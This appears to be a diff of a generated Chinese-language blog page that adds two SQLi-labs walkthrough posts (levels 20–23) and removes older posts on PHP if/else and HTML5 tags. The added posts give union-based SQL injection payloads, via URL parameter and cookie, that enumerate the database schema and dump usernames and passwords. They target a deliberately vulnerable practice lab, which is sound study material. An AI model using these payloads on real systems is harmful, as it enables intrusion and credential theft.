@@ -71,6 +71,103 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-16" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/31/page-16/" class="article-date">
+  <time class="dt-published" datetime="2021-01-31T08:35:05.000Z" itemprop="datePublished">2021-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/31/page-16/">sqlilabs 23</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>z这关就很神奇了 末尾的闭合符号– 和#均被过滤  那么只好用单引号闭合 因为单引号里面的不会被执行 所以用and 闭合 ?id=1’ and  ‘1’=’1</p>
+<p>测试回显 ?id=-1’  union select 1,2,3 and ‘1’=’1   显示的消息是 your login name：2 your password：1</p>
+<p>那么就从select1，2，3的2那边入手</p>
+<p>?id=-1’ union select 1,database(),3 and ‘1’=’1 得到库名 security </p>
+<p>?id=-1’ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 and ‘1’=’1 爆表明</p>
+<p>?id=-1’ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’),3 and ‘1’=’1 爆列名</p>
+<p>?id=-1’ union select 1,(select group_concat(username,password) from users),3 and ‘1’=’1 查数据</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/31/page-16/" data-id="ckroqtfle0007yww7bem6d915" data-title="sqlilabs 23" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-15" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/01/31/page-15/" class="article-date">
+  <time class="dt-published" datetime="2021-01-31T06:43:11.000Z" itemprop="datePublished">2021-01-31</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/01/31/page-15/">sqlilabs 20 21  22 手动注入</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>首先20关过滤了post注入 就只好从cookie入手(用火狐的插件hackbar)</p>
+<p>先登陆一下获取cookie信息 <img src="D:\blog\source_posts\images\image-20210131141955567.png" alt="image-20210131141955567"></p>
+<p>稍微知道一下cookie的格式 然后判断为字符型注入</p>
+<p>uname=aaa’ ordey by 4# 获取位数 数字一个个尝试</p>
+<p><img src="D:\blog\source_posts\images\image-20210131142538658.png" alt="image-20210131142538658"></p>
+<p>到出现这种情况</p>
+<p>然后union语句了</p>
+<p>uname =aaa’ union select 1,2,3 #</p>
+<p>uname=aaa’ union select 1,2,database() # (获取当前使用的数据库名字) 执行后是security</p>
+<p>uname=aaa’ union select 1,2,group_concat(table_name) from informatin_schema.tables where table_schema=‘security’ # (获得所有表名)</p>
+<p>uname=aaa’ union select 1,2,group_concat(columns_name) from information_schema.columns where table_schema=’security’ and table name=’users’ # 获得字段 </p>
+<p>uname=aaa’ union select 1,2,group_concat(username,0x7e,password)from security,users # 获得字段的数据 </p>
+<p>或者用这个语句uname=aaa’ union select 1,2,group_concat(concat_ws(‘-‘,id,username,password)) from users # </p>
+<p>21关稍微变一下用base64 编码一下uname= 之后的内容即可和20一样的 注入符号方式也不一样 构建‘）这样的注入符号   22也是一样就注入符号为” 双引号 然后也是base64 编码一下</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/01/31/page-15/" data-id="ckroqtfld0006yww71nyt6oa3" data-title="sqlilabs 20 21  22 手动注入" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-12" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/01/24/page-12/" class="article-date">
@@ -434,259 +531,11 @@
 
 
   
-    <article id="post-page-1" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/11/04/page-1/" class="article-date">
-  <time class="dt-published" datetime="2020-11-04T11:11:53.000Z" itemprop="datePublished">2020-11-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/11/04/page-1/">page</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="PHP-If…Else-语句"><a href="#PHP-If…Else-语句" class="headerlink" title="PHP If…Else 语句"></a>PHP If…Else 语句</h1><hr>
-<p>条件语句用于根据不同条件执行不同动作。</p>
-<hr>
-<h2 id="PHP-条件语句"><a href="#PHP-条件语句" class="headerlink" title="PHP 条件语句"></a>PHP 条件语句</h2><p>当您编写代码时，您常常需要为不同的判断执行不同的动作。您可以在代码中使用条件语句来完成此任务。</p>
-<p>在 PHP 中，提供了下列条件语句：</p>
-<ul>
-<li><strong>if 语句</strong> - 在条件成立时执行代码</li>
-<li><strong>if…else 语句</strong> - 在条件成立时执行一块代码，条件不成立时执行另一块代码</li>
-<li><strong>if…elseif….else 语句</strong> - 在若干条件之一成立时执行一个代码块</li>
-<li><strong>switch 语句</strong> - 在若干条件之一成立时执行一个代码块</li>
-</ul>
-<hr>
-<h2 id="PHP-if-语句"><a href="#PHP-if-语句" class="headerlink" title="PHP - if 语句"></a>PHP - if 语句</h2><p>if 语句用于<strong>仅当指定条件成立时执行代码</strong>。</p>
-<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">    条件成立时要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果当前时间小于 20，下面的实例将输出 “Have a good day!”：</p>
-<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><?php 
-
-$t=date("H"); 
-
-if ($t<"20") { 
-
-   echo "Have a good day!";
-
- } ?>
-
-<h2 id="PHP-if…else-语句"><a href="#PHP-if…else-语句" class="headerlink" title="PHP - if…else 语句"></a>PHP - if…else 语句</h2><p><strong>在条件成立时执行一块代码，条件不成立时执行另一块代码</strong>，请使用 if….else 语句。</p>
-<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>if (<em>条件</em>)<br>{<br><em>条件成立时执行的代码;</em><br>}<br>else<br>{<br>*条件不成立时执行的代码;<br>*}</p>
-<p>如果当前时间小于 20，下面的实例将输出 “Have a good day!”，否则输出 “Have a good night!”：</p>
-<h2 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h2><?php $t=date("H"); 
-
-if ($t<"20") 
-
-{ 
-
-   echo "Have a good day!"; 
-
-} else
-
- {   
-
- echo "Have a good night!";
-
- } 
-
-?>
-
-<h2 id="PHP-if…elseif…-else-语句"><a href="#PHP-if…elseif…-else-语句" class="headerlink" title="PHP - if…elseif….else 语句"></a>PHP - if…elseif….else 语句</h2><p><strong>在若干条件之一成立时执行一个代码块</strong>，请使用 if….elseif…else 语句。.</p>
-<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (条件)</span><br><span class="line">&#123;</span><br><span class="line">    if 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">elseif (条件)</span><br><span class="line">&#123;</span><br><span class="line">    elseif 条件成立时执行的代码;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    条件不成立时执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>如果当前时间小于 10，下面的实例将输出 “Have a good morning!”，如果当前时间不小于 10 且小于 20，则输出 “Have a good day!”，否则输出 “Have a good night!”：</p>
-<h2 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h2><?php
-
- $t=date("H");
-
- if ($t<"10")
-
- {  
-
-  echo "Have a good morning!";
-
- } 
-
-elseif ($t<"20") 
-
-{    
-
-echo "Have a good day!";
-
- } 
-
-else
-
- {    
-
-echo "Have a good night!";
-
- }
-
- ?>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/04/page-1/" data-id="ckroqtfl90001yww7fuck9vkc" data-title="page" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/10/18/page/" class="article-date">
-  <time class="dt-published" datetime="2020-10-18T13:00:12.000Z" itemprop="datePublished">2020-10-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/10/18/page/">page11</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>HTML5 添加了很多语义元素如下所示：</p>
-<table>
-<thead>
-<tr>
-<th align="left">标签</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><article></td>
-<td align="left">定义页面独立的内容区域。</td>
-</tr>
-<tr>
-<td align="left"><aside></td>
-<td align="left">定义页面的侧边栏内容。</td>
-</tr>
-<tr>
-<td align="left"><bdi></td>
-<td align="left">允许您设置一段文本，使其脱离其父元素的文本方向设置。</td>
-</tr>
-<tr>
-<td align="left"><command></td>
-<td align="left">定义命令按钮，比如单选按钮、复选框或按钮</td>
-</tr>
-<tr>
-<td align="left"><details></td>
-<td align="left">用于描述文档或文档某个部分的细节</td>
-</tr>
-<tr>
-<td align="left"><dialog></td>
-<td align="left">定义对话框，比如提示框</td>
-</tr>
-<tr>
-<td align="left"><summary></td>
-<td align="left">标签包含 details 元素的标题</td>
-</tr>
-<tr>
-<td align="left"><figure></td>
-<td align="left">规定独立的流内容（图像、图表、照片、代码等等）。</td>
-</tr>
-<tr>
-<td align="left"><figcaption></td>
-<td align="left">定义 <figure> 元素的标题</td>
-</tr>
-<tr>
-<td align="left"><footer></td>
-<td align="left">定义 section 或 document 的页脚。</td>
-</tr>
-<tr>
-<td align="left"><header></td>
-<td align="left">定义了文档的头部区域</td>
-</tr>
-<tr>
-<td align="left"><mark></td>
-<td align="left">定义带有记号的文本。</td>
-</tr>
-<tr>
-<td align="left"><meter></td>
-<td align="left">定义度量衡。仅用于已知最大和最小值的度量。</td>
-</tr>
-<tr>
-<td align="left"><nav></td>
-<td align="left">定义导航链接的部分。</td>
-</tr>
-<tr>
-<td align="left"><progress></td>
-<td align="left">定义任何类型的任务的进度。</td>
-</tr>
-<tr>
-<td align="left"><ruby></td>
-<td align="left">定义 ruby 注释（中文注音或字符）。</td>
-</tr>
-<tr>
-<td align="left"><rt></td>
-<td align="left">定义字符（中文注音或字符）的解释或发音。</td>
-</tr>
-<tr>
-<td align="left"><rp></td>
-<td align="left">在 ruby 注释中使用，定义不支持 ruby 元素的浏览器所显示的内容。</td>
-</tr>
-<tr>
-<td align="left"><section></td>
-<td align="left">定义文档中的节（section、区段）。</td>
-</tr>
-<tr>
-<td align="left"><time></td>
-<td align="left">定义日期或时间。</td>
-</tr>
-<tr>
-<td align="left"><wbr></td>
-<td align="left">规定在文本中的何处适合添加换行符。s</td>
-</tr>
-</tbody></table>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2020/10/18/page/" data-id="ckroqtfmc001oyww77q7me1zy" data-title="page11" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span>
+    <a class="extend prev" rel="prev" href="/page/6/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="page-number current">7</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/8/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -718,6 +567,14 @@ echo "Have a good night!";
       <ul>
         
           <li>
+            <a href="/2021/07/29/page-90/">buuctf  misc zip</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/29/page-89/">misc2</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/29/page-88/">羊城杯 2020逃离东南亚</a>
           </li>
         
@@ -727,14 +584,6 @@ echo "Have a good night!";
         
           <li>
             <a href="/2021/07/29/page-86/">CISCN2019 华北赛区 Day1 Web1Dropbox</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-85/">极客大挑战 2019RCE ME</a>
-          </li>
-        
-          <li>
-            <a href="/2021/07/29/page-84/">CISCN2019 华北赛区 Day1 Web2ikun</a>
           </li>
         
       </ul>
